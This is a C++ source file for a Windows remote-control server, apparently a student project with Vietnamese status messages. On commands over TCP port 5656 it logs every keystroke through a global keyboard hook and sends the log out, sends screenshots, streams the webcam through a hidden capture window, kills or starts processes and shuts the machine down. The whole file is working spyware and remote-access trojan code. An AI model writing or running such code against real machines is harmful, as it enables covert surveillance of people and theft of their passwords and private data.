#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <cstring>
#include <tlhelp32.h>
#include <gdiplus.h>
#include <vfw.h>
#include <tchar.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "vfw32.lib")

using namespace std;
using namespace Gdiplus;

// Global Variables
SOCKET serverSocket;
SOCKET clientSocket;
atomic<bool> isKeylogActive(false);
atomic<bool> isRecording(false);
string keylogPath = "fileKeyLog.txt";
HHOOK keyboardHook = NULL;
HWND hCapture = NULL;

// Function Prototypes
void receiveSignal(string& s);
void shutdown();
void keylog();
void takepic();
void processManagement();
void applicationManagement();
void webcam();
void hookKey();
void unhookKey();
void printkeys();
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void startKeyLogger();
void stopKeyLogger();

// String conversion helper compatible with UNICODE/ANSI
static string toUtf8(const TCHAR* tstr) {
#ifdef UNICODE
    int size = WideCharToMultiByte(CP_UTF8, 0, tstr, -1, nullptr, 0, nullptr, nullptr);
    if (size <= 0) return string();
    vector<char> buffer(static_cast<size_t>(size));
    WideCharToMultiByte(CP_UTF8, 0, tstr, -1, buffer.data(), size, nullptr, nullptr);
    return string(buffer.data());
#else
    return string(tstr);
#endif
}

// Network Helper Functions
void sendLine(const string& s) {
    string msg = s + "\n";
    send(clientSocket, msg.c_str(), msg.length(), 0);
}

string receiveLine() {
    string result;
    char c;
    while (recv(clientSocket, &c, 1, 0) > 0) {
        if (c == '\n') break;
        if (c != '\r') result += c;
    }
    return result;
}

void receiveSignal(string& s) {
    try {
        s = receiveLine();
    } catch (...) {
        s = "QUIT";
    }
}

// System Control Functions
void shutdown() {
    system("shutdown /s /t 0");
}

void restart() {
    system("shutdown /r /t 0");
}

// Keylogger Implementation
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN && isKeylogActive) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboard->vkCode;
        
        ofstream file(keylogPath, ios::app);
        if (file.is_open()) {
            bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            switch (vkCode) {
                case VK_SPACE: file << " "; break;
                case VK_RETURN: file << "Enter\n"; break;
                case VK_BACK: file << "Backspace"; break;
                case VK_TAB: file << "Tab"; break;
                case '0': file << (shift ? ")" : "0"); break;
                case '1': file << (shift ? "!" : "1"); break;
                case '2': file << (shift ? "@" : "2"); break;
                case '3': file << (shift ? "#" : "3"); break;
                case '4': file << (shift ? "$" : "4"); break;
                case '5': file << (shift ? "%" : "5"); break;
                case '6': file << (shift ? "^" : "6"); break;
                case '7': file << (shift ? "&" : "7"); break;
                case '8': file << (shift ? "*" : "8"); break;
                case '9': file << (shift ? "(" : "9"); break;
                case VK_OEM_2: file << (shift ? "?" : "/"); break;
                case VK_OEM_4: file << (shift ? "{" : "["); break;
                case VK_OEM_6: file << (shift ? "}" : "]"); break;
                case VK_OEM_1: file << (shift ? ":" : ";"); break;
                case VK_OEM_7: file << (shift ? "\"" : "'"); break;
                case VK_OEM_COMMA: file << (shift ? "<" : ","); break;
                case VK_OEM_PERIOD: file << (shift ? ">" : "."); break;
                case VK_OEM_MINUS: file << (shift ? "_" : "-"); break;
                case VK_OEM_PLUS: file << (shift ? "+" : "="); break;
                case VK_OEM_3: file << (shift ? "~" : "`"); break;
                case VK_OEM_5: file << "|"; break;
                default:
                    if (vkCode >= 'A' && vkCode <= 'Z') {
                        char ch = vkCode;
                        if ((!shift && !caps) || (shift && caps)) {
                            ch = tolower(ch);
                        }
                        file << ch;
                    }
                    break;
            }
            file.close();
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void startKeyLogger() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (isKeylogActive && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void hookKey() {
    isKeylogActive = true;
    ofstream file(keylogPath, ios::trunc);
    file.close();
    
    thread keylogThread(startKeyLogger);
    keylogThread.detach();
}

void unhookKey() {
    isKeylogActive = false;
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
}

void printkeys() {
    ifstream file(keylogPath);
    string content;
    if (file.is_open()) {
        stringstream buffer;
        buffer << file.rdbuf();
        content = buffer.str();
        file.close();
        
        // Clear file
        ofstream clearFile(keylogPath, ios::trunc);
        clearFile.close();
    }
    
    if (content.empty()) {
        content = "\0";
    }
    send(clientSocket, content.c_str(), content.length(), 0);
}

void keylog() {
    string s;
    while (true) {
        receiveSignal(s);
        if (s == "PRINT") printkeys();
        else if (s == "HOOK") hookKey();
        else if (s == "UNHOOK") unhookKey();
        else if (s == "QUIT") return;
    }
}

// Screenshot Function
void takepic() {
    string ss;
    
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    while (true) {
        receiveSignal(ss);
        if (ss == "TAKE") {
            HDC hdcScreen = GetDC(NULL);
            HDC hdcMemory = CreateCompatibleDC(hdcScreen);
            
            int width = GetSystemMetrics(SM_CXSCREEN);
            int height = GetSystemMetrics(SM_CYSCREEN);
            
            HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
            SelectObject(hdcMemory, hBitmap);
            BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
            
            Bitmap* bitmap = new Bitmap(hBitmap, NULL);
            
            IStream* stream = NULL;
            CreateStreamOnHGlobal(NULL, TRUE, &stream);
            
            CLSID pngClsid;
            OLECHAR guidStr[] = L"{557CF406-1A04-11D3-9A73-0000F81EF32E}";
            CLSIDFromString(guidStr, &pngClsid);
            Status status = bitmap->Save(stream, &pngClsid, NULL);
            
            STATSTG statstg;
            stream->Stat(&statstg, STATFLAG_DEFAULT);
            ULONG size = statstg.cbSize.LowPart;
            
            char* buffer = new char[size];
            LARGE_INTEGER li = {0};
            stream->Seek(li, STREAM_SEEK_SET, NULL);
            stream->Read(buffer, size, NULL);
            
            sendLine(to_string(size));
            send(clientSocket, buffer, size, 0);
            
            delete[] buffer;
            delete bitmap;
            stream->Release();
            DeleteObject(hBitmap);
            DeleteDC(hdcMemory);
            ReleaseDC(NULL, hdcScreen);
            
        } else if (ss == "QUIT") {
            GdiplusShutdown(gdiplusToken);
            return;
        }
    }
}

// Process Management
void processManagement() {
    string ss;
    
    while (true) {
        receiveSignal(ss);
        
        if (ss == "XEM") {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);
                
                vector<PROCESSENTRY32> processes;
                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        processes.push_back(pe32);
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
                
                sendLine(to_string(processes.size()));
                
                for (const auto& proc : processes) {
                    sendLine(toUtf8(proc.szExeFile));
                    sendLine(to_string(proc.th32ProcessID));
                    sendLine(to_string(proc.cntThreads));
                }
            }
        } else if (ss == "KILL") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "KILLID") {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            sendLine("Da diet process");
                        } else {
                            sendLine("Loi");
                        }
                        CloseHandle(hProcess);
                    } else {
                        sendLine("Loi");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "START") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "STARTID") {
                    string exeName = receiveLine();
                    exeName += ".exe";
                    
                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);
                    
                    if (CreateProcessA(NULL, (LPSTR)exeName.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                        sendLine("Process da duoc bat");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    } else {
                        sendLine("Loi");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "QUIT") {
            return;
        }
    }
}

// Application Management (processes with windows)
void applicationManagement() {
    string ss;
    
    while (true) {
        receiveSignal(ss);
        
        if (ss == "XEM") {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                ZeroMemory(&pe32, sizeof(pe32));
                pe32.dwSize = sizeof(PROCESSENTRY32);
                
                vector<PROCESSENTRY32> processes;
                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        processes.push_back(pe32);
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
                
                sendLine(to_string(processes.size()));
                
                for (const auto& proc : processes) {
                    // Simple check - assume processes with main window title have a window
                    // This is a simplified version to avoid lambda issues
                    sendLine("ok");
                    sendLine(toUtf8(proc.szExeFile));
                    sendLine(to_string(proc.th32ProcessID));
                    sendLine(to_string(proc.cntThreads));
                }
            }
        } else if (ss == "KILL") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "KILLID") {
                    string pidStr = receiveLine();
                    DWORD pid = stoul(pidStr);
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProcess != NULL) {
                        if (TerminateProcess(hProcess, 0)) {
                            sendLine("Da diet chuong trinh");
                        } else {
                            sendLine("Loi");
                        }
                        CloseHandle(hProcess);
                    } else {
                        sendLine("Khong tim thay chuong trinh");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "START") {
            bool test = true;
            while (test) {
                receiveSignal(ss);
                if (ss == "STARTID") {
                    string exeName = receiveLine();
                    exeName += ".exe";
                    
                    STARTUPINFOA si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);
                    
                    if (CreateProcessA(NULL, (LPSTR)exeName.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                        sendLine("Chuong trinh da duoc bat");
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    } else {
                        sendLine("Loi");
                    }
                } else if (ss == "QUIT") {
                    test = false;
                }
            }
        } else if (ss == "QUIT") {
            return;
        }
    }
}

// Helper function to get JPEG encoder CLSID
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Frame callback for fast MJPG streaming (based on TestRTSP)
static LRESULT CALLBACK FrameCallback(HWND hWnd, LPVIDEOHDR lpVH) {
    if (clientSocket == INVALID_SOCKET) return 0;
    if (!isRecording) return 0;

    // Get frame size from camera
    DWORD dataSize = lpVH->dwBytesUsed;
    
    // Skip invalid frames
    if (dataSize < 1024) return 0;
    
    // 1. Gửi Magic Number (Header) để đánh dấu bắt đầu frame
    int magic = 0xFFFFFFFF; 
    send(clientSocket, (char*)&magic, sizeof(magic), 0);
    
    // Send frame size (binary DWORD)
    int iResult = send(clientSocket, (char*)&dataSize, sizeof(dataSize), 0);
    if (iResult == SOCKET_ERROR) {
        isRecording = false;
        return 0;
    }

    // Send frame data directly (MJPG compressed from camera)
    iResult = send(clientSocket, (char*)lpVH->lpData, dataSize, 0);
    if (iResult == SOCKET_ERROR) {
        isRecording = false;
    }

    return (LRESULT)TRUE;
}

// Webcam Streaming - optimized with MJPG passthrough (no re-encoding)
void webcam() {
    string cmd;
    bool streaming = false;

    while (true) {
        receiveSignal(cmd);

        if (cmd == "START") {
            if (!streaming) {
                streaming = true;
                sendLine("OK");

                thread streamThread([&]() {
                    // Create hidden capture window
                    hCapture = capCreateCaptureWindowA("WebcamCap",
                                                       WS_POPUP, 0, 0, 640, 480,
                                                       NULL, 0);
                    if (!hCapture) {
                        streaming = false;
                        sendLine("STOPPED");
                        return;
                    }

                    if (!SendMessage(hCapture, WM_CAP_DRIVER_CONNECT, 0, 0)) {
                        DestroyWindow(hCapture);
                        hCapture = NULL;
                        streaming = false;
                        sendLine("STOPPED");
                        return;
                    }

                    // Force MJPG format for direct passthrough
                    BITMAPINFO bmpInfo = {0};
                    bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                    bmpInfo.bmiHeader.biWidth = 640;
                    bmpInfo.bmiHeader.biHeight = 480;
                    bmpInfo.bmiHeader.biPlanes = 1;
                    bmpInfo.bmiHeader.biBitCount = 24;
                    bmpInfo.bmiHeader.biCompression = MAKEFOURCC('M', 'J', 'P', 'G');
                    bmpInfo.bmiHeader.biSizeImage = 640 * 480 * 3;
                    
                    if (!SendMessage(hCapture, WM_CAP_SET_VIDEOFORMAT, sizeof(BITMAPINFOHEADER), (LPARAM)&bmpInfo)) {
                        // Camera may not support MJPG, fallback to default
                    }

                    // Optimize socket for streaming
                    char opt = 1;
                    setsockopt(clientSocket, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
                    int sendBuff = 1024 * 1024; // 1MB send buffer
                    setsockopt(clientSocket, SOL_SOCKET, SO_SNDBUF, (char*)&sendBuff, sizeof(sendBuff));

                    // Set up frame callback for direct passthrough
                    SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, (LPARAM)FrameCallback);
                    SendMessage(hCapture, WM_CAP_SET_PREVIEWRATE, 1, 0);
                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, TRUE, 0);

                    isRecording = true;

                    // Keep grabbing frames while streaming
                    while (streaming && isRecording) {
                        SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
                        // No sleep - run at maximum camera speed (typically 30fps)
                    }

                    // Cleanup
                    isRecording = false;
                    
                    if (hCapture) {
                        SendMessage(hCapture, WM_CAP_SET_CALLBACK_FRAME, 0, 0);
                        SendMessage(hCapture, WM_CAP_SET_PREVIEW, FALSE, 0);
                        SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                        DestroyWindow(hCapture);
                        hCapture = NULL;
                    }
                });
                streamThread.detach();

            } else {
                sendLine("ERROR: Already streaming");
            }

        } else if (cmd == "STOP") {
            if (streaming) {
                streaming = false;
                isRecording = false;
                sendLine("STOPPED");
            } else {
                sendLine("ERROR: Not streaming");
            }

        } else if (cmd == "QUIT") {
            return;
        }
    }
}
// Main Server Function
int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cerr << "WSAStartup failed" << endl;
        return 1;
    }
    
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        cerr << "Socket creation failed" << endl;
        WSACleanup();
        return 1;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(5656);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cerr << "Bind failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    if (listen(serverSocket, 100) == SOCKET_ERROR) {
        cerr << "Listen failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Server listening on port 5656..." << endl;
    
    clientSocket = accept(serverSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET) {
        cerr << "Accept failed" << endl;
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }
    
    cout << "Client connected!" << endl;
    
    string s;
    while (true) {
        receiveSignal(s);
        
        if (s == "KEYLOG") {
            keylog();
        } else if (s == "SHUTDOWN") {
            shutdown();
        } else if (s == "TAKEPIC") {
            takepic();
        } else if (s == "PROCESS") {
            processManagement();
        } else if (s == "APPLICATION") {
            applicationManagement();
        } else if (s == "WEBCAM") {
            webcam();
        } else if (s == "QUIT") {
            break;
        }
    }
    
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();
    
    return 0;
}
